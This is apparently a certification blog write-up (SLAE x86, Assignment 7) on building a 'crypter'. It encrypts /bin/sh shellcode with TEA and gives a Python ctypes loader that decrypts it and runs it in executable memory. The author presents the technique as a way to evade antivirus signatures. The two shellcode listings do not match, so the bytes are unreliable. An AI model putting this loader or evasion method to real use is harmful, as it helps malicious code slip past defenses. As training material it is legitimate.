---
layout: post
title:  "SLAE x86 Exam - Assignment 7"
categories: certs slae 
---


## Assignment #7 - Custom crypter
_Student ID: **PA-7854**_

The assignment indications are as follows:
* Create a custom crypter 
* Feel free to use any existing encryption schema
* Using any programming language 

The code is available at [my github repo](https://github.com/0xKiewicz/SLAE).


#### Encryption
Sometimes encryption is helpful to bypass fingerprint/signature antivirus mechanisms. It can also defeat users when trying to disassemble too, as it appears as gibberish. 

There are a few [block ciphers](https://en.wikipedia.org/wiki/Block_cipher#Notable_block_ciphers) we can use, but to keep things easy, I picked up the [Tiny Encryption Algorithm](https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm).
As written in the _properties_ section in previous link, this cipher *has a few weaknesses*, so it is being used here only as part of an example, but not for a real use case.

Having said that, let's start.


#### Crypter
We are going to use the previous `execve-stack` shellcode, which runs `/bin/sh`:
```nasm
\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

Instead of reinventing the wheel and writing my own script from scratch, I have found a lot of implementations of TEA (Tiny Encryption Algorithm), which i can use for this task, I implement it by using the [PyTEA](https://github.com/codeif/PyTEA), a Python library.


```python
key = b'slaeisthebest!!!'
tea = TEA(key)
shellcode_data  = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
encrypted = tea.encrypt(shellcode_data)
print('Encrypted hex:', encrypted.hex())
sleep(1)
print('Decrypting and running...')
sleep(1)
decrypted = tea.decrypt(encrypted)

shellcode = ctypes.create_string_buffer(bytes(decrypted))
function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))

addr = ctypes.cast(function, ctypes.c_void_p).value
libc = ctypes.CDLL('libc.so.6')
pagesize = libc.getpagesize()
addr_page = (addr // pagesize) * pagesize
for page_start in range(addr_page, addr + len(shellcode_data), pagesize):
        assert libc.mprotect(page_start, pagesize, 0x7) == 0

        function()
```

We simply encrypt by using the key *slaeisthebest!!!* and print it on screen. Then we just decrypt and run the shellcode in a memory segment which there are executable permissions.

That's all the certification requirements and thanks for having the time to read this further :).

*SLAEx64* coming soon ;)
